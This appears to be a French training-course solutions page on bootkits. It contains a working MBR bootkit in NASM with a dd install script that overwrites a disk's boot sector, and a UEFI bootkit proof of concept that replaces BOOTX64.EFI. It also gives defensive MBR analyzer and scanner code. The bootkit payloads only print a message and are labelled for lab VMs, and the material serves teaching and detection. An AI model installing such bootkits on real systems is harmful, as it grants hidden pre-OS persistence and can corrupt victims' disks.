# Solutions - Bootkit Concepts

## Exercice 1 : Analyser la structure MBR (Très facile)

**Objectif** : Créer un outil qui lit et affiche la structure d'un MBR.

### Solution

```c
/*
 * Analyseur de structure MBR (Master Boot Record)
 *
 * Compilation : gcc -o mbr_analyzer mbr_analyzer.c
 * Usage : sudo ./mbr_analyzer /dev/sda
 *         ou : ./mbr_analyzer mbr_backup.bin
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// Structure d'une entrée de partition
typedef struct {
    uint8_t  boot_flag;          // 0x80 = bootable, 0x00 = non-bootable
    uint8_t  chs_start[3];       // CHS start (obsolète)
    uint8_t  partition_type;     // Type de partition
    uint8_t  chs_end[3];         // CHS end (obsolète)
    uint32_t lba_start;          // Premier secteur LBA
    uint32_t num_sectors;        // Nombre de secteurs
} __attribute__((packed)) PartitionEntry;

// Structure MBR complète
typedef struct {
    uint8_t         bootstrap[446];      // Code de démarrage
    PartitionEntry  partitions[4];       // 4 entrées de partition
    uint16_t        signature;           // 0x55AA
} __attribute__((packed)) MBR;

// Types de partition courants
const char* get_partition_type(uint8_t type) {
    switch (type) {
        case 0x00: return "Empty";
        case 0x01: return "FAT12";
        case 0x04: return "FAT16 (< 32 MB)";
        case 0x05: return "Extended";
        case 0x06: return "FAT16";
        case 0x07: return "NTFS/exFAT/HPFS";
        case 0x0B: return "FAT32 (CHS)";
        case 0x0C: return "FAT32 (LBA)";
        case 0x0E: return "FAT16 (LBA)";
        case 0x0F: return "Extended (LBA)";
        case 0x82: return "Linux Swap";
        case 0x83: return "Linux";
        case 0x85: return "Linux Extended";
        case 0x8E: return "Linux LVM";
        case 0xEE: return "GPT Protective";
        case 0xEF: return "EFI System";
        default:   return "Unknown";
    }
}

// Analyser le bootstrap code
void analyze_bootstrap(uint8_t* bootstrap) {
    printf("[*] Analyse du bootstrap code\n");
    printf("==============================\n\n");

    // Vérifier si le code est vide (rempli de 0x00 ou 0xFF)
    int is_empty = 1;
    int is_suspicious = 0;

    for (int i = 0; i < 446; i++) {
        if (bootstrap[i] != 0x00 && bootstrap[i] != 0xFF) {
            is_empty = 0;
        }
        // Chercher des patterns suspects
        if (i < 440 && memcmp(&bootstrap[i], "BOOTKIT", 7) == 0) {
            is_suspicious = 1;
        }
    }

    if (is_empty) {
        printf("[-] Bootstrap code vide (MBR non initialisé ?)\n");
    } else {
        printf("[+] Bootstrap code présent\n");

        // Afficher les premiers bytes
        printf("\n[*] Premiers 32 bytes du bootstrap :\n    ");
        for (int i = 0; i < 32; i++) {
            printf("%02X ", bootstrap[i]);
            if ((i + 1) % 16 == 0) printf("\n    ");
        }
        printf("\n");

        // Chercher des instructions x86 typiques
        if (bootstrap[0] == 0xEB || bootstrap[0] == 0xE9) {
            printf("[+] Commence par JMP (0x%02X) - Bootstrap standard\n", bootstrap[0]);
        } else if (bootstrap[0] == 0xFA) {
            printf("[+] Commence par CLI (0xFA) - Bootstrap custom\n");
        } else {
            printf("[!] Début inhabituel : 0x%02X\n", bootstrap[0]);
        }
    }

    if (is_suspicious) {
        printf("\n[!!!] ALERTE : Pattern suspect détecté dans le bootstrap\n");
        printf("          Possible bootkit ou code malveillant\n");
    }
}

// Analyser les partitions
void analyze_partitions(PartitionEntry* partitions) {
    printf("\n[*] Table de partitions\n");
    printf("=======================\n\n");

    for (int i = 0; i < 4; i++) {
        if (partitions[i].partition_type == 0x00) {
            printf("Partition %d : Vide\n", i + 1);
            continue;
        }

        printf("Partition %d :\n", i + 1);
        printf("    Bootable     : %s\n",
               partitions[i].boot_flag == 0x80 ? "OUI" : "NON");
        printf("    Type         : 0x%02X (%s)\n",
               partitions[i].partition_type,
               get_partition_type(partitions[i].partition_type));
        printf("    LBA Start    : %u\n", partitions[i].lba_start);
        printf("    Secteurs     : %u\n", partitions[i].num_sectors);

        // Calculer la taille
        uint64_t size_mb = ((uint64_t)partitions[i].num_sectors * 512) / (1024 * 1024);
        uint64_t size_gb = size_mb / 1024;

        if (size_gb > 0) {
            printf("    Taille       : %lu GB\n", size_gb);
        } else {
            printf("    Taille       : %lu MB\n", size_mb);
        }

        printf("\n");
    }
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <device_or_file>\n", argv[0]);
        printf("Exemples:\n");
        printf("  sudo %s /dev/sda\n", argv[0]);
        printf("  %s mbr_backup.bin\n", argv[0]);
        return 1;
    }

    const char* filename = argv[1];

    printf("[*] Analyseur MBR\n");
    printf("[*] =============\n\n");
    printf("[*] Lecture de : %s\n\n", filename);

    // Ouvrir le fichier/device
    FILE* f = fopen(filename, "rb");
    if (!f) {
        perror("Erreur ouverture");
        printf("\nNote : Pour lire un device, root est requis\n");
        return 1;
    }

    // Lire le MBR (512 bytes)
    MBR mbr;
    if (fread(&mbr, sizeof(mbr), 1, f) != 1) {
        printf("[-] Erreur lecture MBR\n");
        fclose(f);
        return 1;
    }

    fclose(f);

    // Vérifier la signature
    printf("[*] Vérification de la signature\n");
    printf("=================================\n\n");

    if (mbr.signature == 0xAA55) {
        printf("[+] Signature MBR valide : 0x55AA\n");
    } else {
        printf("[!] Signature invalide : 0x%04X (attendu 0xAA55)\n", mbr.signature);
        printf("    Ce n'est pas un MBR valide ou le fichier est corrompu\n");
        return 1;
    }

    // Analyser le bootstrap
    analyze_bootstrap(mbr.bootstrap);

    // Analyser les partitions
    analyze_partitions(mbr.partitions);

    // Analyse de sécurité
    printf("[*] Analyse de sécurité\n");
    printf("=======================\n\n");

    int gpt_detected = 0;
    for (int i = 0; i < 4; i++) {
        if (mbr.partitions[i].partition_type == 0xEE) {
            gpt_detected = 1;
            break;
        }
    }

    if (gpt_detected) {
        printf("[+] GPT Protective MBR détecté\n");
        printf("    Ce système utilise GPT (UEFI), pas MBR legacy\n");
        printf("    Les bootkits MBR classiques ne fonctionneront pas\n");
    } else {
        printf("[+] MBR legacy standard\n");
        printf("    Vulnérable aux bootkits MBR si Secure Boot désactivé\n");
    }

    return 0;
}
```

**Explication** :
- On lit les 512 premiers bytes du disque
- On parse la structure MBR (bootstrap + partitions + signature)
- On vérifie la signature magique `0x55AA`
- On analyse le bootstrap code pour détecter des anomalies

---

## Exercice 2 : Créer un bootkit MBR basique (Facile)

**Objectif** : Écrire un bootkit MBR en assembleur qui affiche un message au boot.

### Solution

**Fichier bootkit.asm** :
```nasm
;
; MBR Bootkit minimal - Proof of Concept
;
; Assembleur : NASM
; Compilation : nasm -f bin -o bootkit.bin bootkit.asm
;

[BITS 16]               ; Mode réel 16-bit
[ORG 0x7C00]            ; BIOS charge le MBR à 0x7C00

start:
    ; Initialiser les segments
    cli                 ; Désactiver les interruptions
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00      ; Stack juste avant le MBR
    sti                 ; Réactiver les interruptions

    ; Afficher le message bootkit
    mov si, msg_bootkit
    call print_string

    ; Attendre une touche
    mov si, msg_wait
    call print_string
    call wait_key

    ; Charger le MBR original (sauvegardé au secteur 62)
    mov ah, 0x02        ; INT 13h fonction 02h = Read Sectors
    mov al, 1           ; Lire 1 secteur
    mov ch, 0           ; Cylindre 0
    mov cl, 62          ; Secteur 62 (où on a sauvé l'original)
    mov dh, 0           ; Tête 0
    mov dl, 0x80        ; Disque 0 (premier HDD)
    mov bx, 0x7C00      ; Charger à 0x7C00 (écraser notre bootkit)
    int 0x13            ; Appel BIOS

    jc error            ; Si erreur (carry flag)

    ; Sauter vers le MBR original
    jmp 0x0000:0x7C00

error:
    mov si, msg_error
    call print_string
    cli
    hlt                 ; Arrêter le CPU

; ===== Fonctions =====

; Afficher une string (terminée par 0)
print_string:
    push ax
    mov ah, 0x0E        ; INT 10h fonction 0Eh = Teletype output
.loop:
    lodsb               ; Charger [DS:SI] dans AL, incrémenter SI
    test al, al         ; Tester si AL == 0
    jz .done
    int 0x10            ; Afficher le caractère
    jmp .loop
.done:
    pop ax
    ret

; Attendre une touche
wait_key:
    mov ah, 0x00        ; INT 16h fonction 00h = Read keystroke
    int 0x16            ; Attendre une touche
    ret

; ===== Données =====

msg_bootkit:
    db 13, 10
    db '╔═══════════════════════════════════════════╗', 13, 10
    db '║   BOOTKIT ACTIF - Système compromis      ║', 13, 10
    db '║                                           ║', 13, 10
    db '║   Ce message prouve que le bootkit       ║', 13, 10
    db '║   s', 39, 'exécute AVANT le système d', 39, 'exploitation  ║', 13, 10
    db '╚═══════════════════════════════════════════╝', 13, 10
    db 13, 10, 0

msg_wait:
    db 'Appuyez sur une touche pour continuer le boot...', 13, 10, 0

msg_error:
    db 13, 10
    db 'ERREUR : Impossible de charger le MBR original', 13, 10
    db 'Système bloqué', 13, 10, 0

; Padding jusqu'à 510 bytes
times 510 - ($ - $$) db 0

; Signature MBR obligatoire
dw 0xAA55
```

**Script d'installation (install_bootkit.sh)** :
```bash
#!/bin/bash
#
# Installation du bootkit MBR (LAB/VM UNIQUEMENT)
# ATTENTION : DÉTRUIRA LE MBR DU DISQUE CIBLE
#

set -e

if [ "$EUID" -ne 0 ]; then
    echo "[-] Root requis"
    exit 1
fi

DEVICE=${1:-/dev/sda}
MBR_BACKUP="/tmp/mbr_original.bin"
MBR_BOOTKIT="bootkit.bin"
MBR_NEW="/tmp/mbr_infected.bin"

echo "[*] Installation du bootkit MBR"
echo "[*] ============================="
echo ""
echo "[!] AVERTISSEMENT : Ceci va modifier le MBR de $DEVICE"
echo "[!] À utiliser UNIQUEMENT sur une VM de test !"
echo ""
read -p "Continuer ? (y/N) : " -n 1 -r
echo ""

if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "[-] Annulé"
    exit 0
fi

# 1. Sauvegarder le MBR original
echo "[*] Sauvegarde du MBR original..."
dd if=$DEVICE of=$MBR_BACKUP bs=512 count=1 status=none

if [ ! -f $MBR_BACKUP ]; then
    echo "[-] Échec sauvegarde"
    exit 1
fi

echo "[+] MBR sauvegardé : $MBR_BACKUP"

# 2. Extraire la table de partitions (offset 446-511)
echo "[*] Extraction de la table de partitions..."
dd if=$MBR_BACKUP of=/tmp/partition_table.bin bs=1 skip=446 count=66 status=none

# 3. Créer le nouveau MBR
echo "[*] Création du MBR infecté..."
cp $MBR_BOOTKIT $MBR_NEW

# Remplacer les derniers 66 bytes par la table de partitions originale
dd if=/tmp/partition_table.bin of=$MBR_NEW bs=1 seek=446 conv=notrunc status=none

echo "[+] MBR infecté créé : $MBR_NEW"

# 4. Sauvegarder le MBR original dans un secteur non utilisé
echo "[*] Sauvegarde MBR original au secteur 62..."
dd if=$MBR_BACKUP of=$DEVICE bs=512 seek=62 count=1 status=none

# 5. Installer le bootkit
echo "[*] Installation du bootkit..."
dd if=$MBR_NEW of=$DEVICE bs=512 count=1 status=none

echo ""
echo "[+] Bootkit installé avec succès !"
echo ""
echo "[*] Au prochain reboot :"
echo "    1. Le bootkit s'affichera"
echo "    2. Appuyer sur une touche"
echo "    3. Le MBR original se chargera"
echo "    4. Le boot continuera normalement"
echo ""
echo "[*] Pour restaurer le MBR original :"
echo "    sudo dd if=$MBR_BACKUP of=$DEVICE bs=512 count=1"
echo ""
```

**Compilation et installation** :
```bash
# 1. Compiler le bootkit
nasm -f bin -o bootkit.bin bootkit.asm

# 2. Vérifier la taille (doit être 512 bytes)
ls -l bootkit.bin

# 3. Installer (VM uniquement !)
sudo bash install_bootkit.sh /dev/sda

# 4. Rebooter
sudo reboot
```

---

## Exercice 3 : Détecter un bootkit MBR (Moyen)

**Objectif** : Créer un scanner qui détecte les bootkits MBR courants.

### Solution

```c
/*
 * Détecteur de bootkit MBR
 *
 * Compilation : gcc -o bootkit_scanner bootkit_scanner.c
 * Usage : sudo ./bootkit_scanner /dev/sda
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// Signatures de bootkits connus
typedef struct {
    const char* name;
    uint8_t pattern[16];
    int pattern_len;
    int offset;
} BootkitSignature;

BootkitSignature known_bootkits[] = {
    // TDL4 Bootkit
    {
        "TDL4",
        {0xEB, 0x4C, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00},
        8,
        0
    },
    // Bootkit générique (pattern "BOOTKIT" dans le code)
    {
        "Generic Bootkit Marker",
        {'B', 'O', 'O', 'T', 'K', 'I', 'T'},
        7,
        -1  // -1 = chercher partout
    },
    // Mebroot
    {
        "Mebroot",
        {0x33, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C},
        7,
        0
    }
};

#define NUM_SIGNATURES (sizeof(known_bootkits) / sizeof(BootkitSignature))

// Chercher un pattern dans le MBR
int find_pattern(uint8_t* mbr, uint8_t* pattern, int pattern_len, int offset) {
    if (offset >= 0) {
        // Offset fixe
        return (memcmp(mbr + offset, pattern, pattern_len) == 0);
    } else {
        // Chercher partout
        for (int i = 0; i < 440; i++) {  // 440 = taille du bootstrap
            if (memcmp(mbr + i, pattern, pattern_len) == 0) {
                return 1;
            }
        }
        return 0;
    }
}

// Calculer l'entropie du bootstrap code
double calculate_entropy(uint8_t* data, int len) {
    int freq[256] = {0};

    for (int i = 0; i < len; i++) {
        freq[data[i]]++;
    }

    double entropy = 0.0;
    for (int i = 0; i < 256; i++) {
        if (freq[i] > 0) {
            double p = (double)freq[i] / len;
            entropy -= p * (log(p) / log(2));
        }
    }

    return entropy;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <device>\n", argv[0]);
        printf("Exemple: sudo %s /dev/sda\n", argv[0]);
        return 1;
    }

    const char* device = argv[1];

    printf("[*] Scanner de bootkit MBR\n");
    printf("[*] ======================\n\n");

    // Lire le MBR
    FILE* f = fopen(device, "rb");
    if (!f) {
        perror("Erreur ouverture device (root requis)");
        return 1;
    }

    uint8_t mbr[512];
    if (fread(mbr, 1, 512, f) != 512) {
        printf("[-] Erreur lecture MBR\n");
        fclose(f);
        return 1;
    }

    fclose(f);

    printf("[+] MBR lu depuis %s\n\n", device);

    // Vérifier la signature
    if (mbr[510] != 0x55 || mbr[511] != 0xAA) {
        printf("[!] Signature MBR invalide\n");
        return 1;
    }

    // Chercher des signatures connues
    printf("[*] Scan de signatures de bootkits connus\n");
    printf("==========================================\n\n");

    int detected = 0;

    for (int i = 0; i < NUM_SIGNATURES; i++) {
        if (find_pattern(mbr,
                        known_bootkits[i].pattern,
                        known_bootkits[i].pattern_len,
                        known_bootkits[i].offset)) {
            printf("[!!!] BOOTKIT DÉTECTÉ : %s\n", known_bootkits[i].name);
            detected = 1;
        }
    }

    if (!detected) {
        printf("[+] Aucune signature de bootkit connu détectée\n");
    }

    // Analyse heuristique
    printf("\n[*] Analyse heuristique\n");
    printf("=======================\n\n");

    // Calculer l'entropie
    double entropy = calculate_entropy(mbr, 440);
    printf("[*] Entropie du bootstrap : %.2f bits\n", entropy);

    if (entropy < 2.0) {
        printf("    → Bootstrap quasi vide (MBR standard ou vide)\n");
    } else if (entropy > 6.0) {
        printf("    [!] Entropie élevée : code possiblement chiffré/obfusqué\n");
        printf("        Peut indiquer un bootkit sophistiqué\n");
    } else {
        printf("    → Entropie normale pour du code assembleur\n");
    }

    // Vérifier si le code charge d'autres secteurs
    printf("\n[*] Recherche d'appels INT 13h (lecture disque)\n");
    int disk_reads = 0;

    for (int i = 0; i < 440 - 1; i++) {
        // Pattern : MOV AH, 02h / INT 13h (lecture secteur)
        if ((mbr[i] == 0xB4 && mbr[i+1] == 0x02) ||  // MOV AH, 02
            (mbr[i] == 0xCD && mbr[i+1] == 0x13)) {  // INT 13h
            disk_reads++;
        }
    }

    printf("    Appels INT 13h trouvés : %d\n", disk_reads);

    if (disk_reads == 0) {
        printf("    [!] SUSPECT : Aucun appel INT 13h détecté\n");
        printf("        Un MBR normal doit charger le VBR\n");
    } else if (disk_reads > 3) {
        printf("    [!] SUSPECT : Nombre élevé d'appels disque\n");
        printf("        Peut indiquer un chargement multi-stage\n");
    }

    // Verdict final
    printf("\n[*] Verdict\n");
    printf("===========\n\n");

    if (detected) {
        printf("[!!!] CRITIQUE : Bootkit détecté sur %s\n", device);
        printf("\n      Actions recommandées :\n");
        printf("      1. NE PAS redémarrer le système\n");
        printf("      2. Dumper le MBR pour analyse : dd if=%s of=mbr_infected.bin bs=512 count=1\n", device);
        printf("      3. Restaurer un MBR propre ou réinstaller le système\n");
        printf("      4. Scanner le système avec un antivirus à jour\n");
    } else {
        printf("[+] Aucun bootkit évident détecté\n");
        printf("    Note : Cette analyse n'est pas exhaustive\n");
        printf("    Utilisez des outils spécialisés pour une analyse complète\n");
    }

    return 0;
}
```

**Explication** :
- On compare le MBR contre des signatures de bootkits connus (TDL4, Mebroot, etc.)
- On calcule l'entropie du bootstrap code (code chiffré = entropie élevée)
- On cherche des patterns suspects (INT 13h multiples, absence de code disque)

---

## Exercice 4 : UEFI Bootkit basique (Difficile)

**Objectif** : Créer un bootloader UEFI qui hook le boot original.

### Solution

```c
/*
 * UEFI Bootkit PoC - Hook de bootloader
 *
 * Compilation : voir script de build ci-dessous
 * Installation : Remplacer /boot/efi/EFI/BOOT/BOOTX64.EFI
 */

#include <efi.h>
#include <efilib.h>

// Fonction principale du bootkit
EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    InitializeLib(ImageHandle, SystemTable);

    // Désactiver le watchdog timer
    uefi_call_wrapper(SystemTable->BootServices->SetWatchdogTimer, 4, 0, 0, 0, NULL);

    // Afficher le message bootkit
    Print(L"\n\n");
    Print(L"═══════════════════════════════════════════════\n");
    Print(L"  UEFI BOOTKIT ACTIF - Système compromis       \n");
    Print(L"═══════════════════════════════════════════════\n");
    Print(L"\n");
    Print(L"[*] Exécution pré-OS en cours...\n");
    Print(L"[*] Contrôle total du boot process\n");
    Print(L"\n");

    // Hook de protocol (exemple : Simple Text Input pour keylogger)
    // Dans un vrai bootkit, on hookerait ici des protocols critiques

    // Attendre 3 secondes
    Print(L"[*] Chargement du bootloader original dans 3 secondes...\n\n");
    uefi_call_wrapper(SystemTable->BootServices->Stall, 1, 3000000);  // 3 secondes

    // Charger le bootloader original (renommé)
    EFI_DEVICE_PATH *FilePath = FileDevicePath(
        ImageHandle,
        L"\\EFI\\BOOT\\BOOTX64.ORIGINAL"  // Bootloader original renommé
    );

    if (!FilePath) {
        Print(L"[-] Erreur : Impossible de trouver le bootloader original\n");
        Print(L"    Attendu : \\EFI\\BOOT\\BOOTX64.ORIGINAL\n\n");
        Print(L"Appuyez sur une touche...\n");

        EFI_INPUT_KEY Key;
        while (uefi_call_wrapper(SystemTable->ConIn->ReadKeyStroke, 2,
                                SystemTable->ConIn, &Key) == EFI_NOT_READY);

        return EFI_NOT_FOUND;
    }

    // Charger l'image du bootloader original
    EFI_HANDLE LoadedImageHandle;
    EFI_STATUS Status = uefi_call_wrapper(
        SystemTable->BootServices->LoadImage,
        6,
        FALSE,               // BootPolicy
        ImageHandle,         // ParentImageHandle
        FilePath,            // DevicePath
        NULL,                // SourceBuffer
        0,                   // SourceSize
        &LoadedImageHandle   // ImageHandle
    );

    if (EFI_ERROR(Status)) {
        Print(L"[-] Erreur LoadImage : %r\n", Status);
        return Status;
    }

    Print(L"[+] Bootloader original chargé\n");
    Print(L"[+] Transfert du contrôle...\n\n");

    // Démarrer le bootloader original
    Status = uefi_call_wrapper(
        SystemTable->BootServices->StartImage,
        3,
        LoadedImageHandle,
        NULL,
        NULL
    );

    // Si on arrive ici, c'est que StartImage a échoué
    Print(L"[-] Erreur StartImage : %r\n", Status);

    return Status;
}
```

**Script de compilation (build_bootkit.sh)** :
```bash
#!/bin/bash
#
# Build du UEFI Bootkit
#

set -e

echo "[*] Compilation du UEFI Bootkit"
echo "================================"

# Compiler
gcc -I/usr/include/efi -I/usr/include/efi/x86_64 \
    -fno-stack-protector -fpic -fshort-wchar -mno-red-zone \
    -DEFI_FUNCTION_WRAPPER -c bootkit.c -o bootkit.o

# Linker
ld -nostdlib -znocombreloc -T /usr/lib/elf_x86_64_efi.lds -shared \
   -Bsymbolic -L /usr/lib /usr/lib/crt0-efi-x86_64.o bootkit.o \
   -o bootkit.so -lefi -lgnuefi

# Convertir en .efi
objcopy -j .text -j .sdata -j .data -j .dynamic -j .dynsym -j .rel \
        -j .rela -j .reloc --target=efi-app-x86_64 bootkit.so bootkit.efi

echo "[+] Bootkit compilé : bootkit.efi"
echo ""
echo "[*] Installation (À FAIRE MANUELLEMENT) :"
echo "    1. sudo mount /dev/sda1 /mnt  # Monter l'ESP"
echo "    2. sudo cp /mnt/EFI/BOOT/BOOTX64.EFI /mnt/EFI/BOOT/BOOTX64.ORIGINAL"
echo "    3. sudo cp bootkit.efi /mnt/EFI/BOOT/BOOTX64.EFI"
echo "    4. sudo umount /mnt"
echo "    5. reboot"
echo ""
echo "[!] AVERTISSEMENT : Faire un backup de l'ESP avant !"
```

**Explication** :
- Le bootkit s'installe en remplaçant `BOOTX64.EFI`
- Il renomme l'original en `BOOTX64.ORIGINAL`
- Au boot, le bootkit s'exécute en premier, affiche un message, puis charge l'original
- Dans un vrai bootkit, on hookerait des protocols UEFI pour établir la persistence

---

## Auto-évaluation

Avant de passer au module suivant, vérifie que tu peux :

- [x] Expliquer la structure MBR (bootstrap + partitions + signature)
- [x] Écrire un bootkit MBR basique en assembleur
- [x] Installer un bootkit de manière sécurisée (backup + secteur caché)
- [x] Détecter les bootkits via signatures et analyse heuristique
- [x] Comprendre la différence MBR/VBR/UEFI bootkits
- [x] Créer un bootloader UEFI qui hook le boot process

**Module suivant** : [SMM Basics](../05-SMM-Basics/)
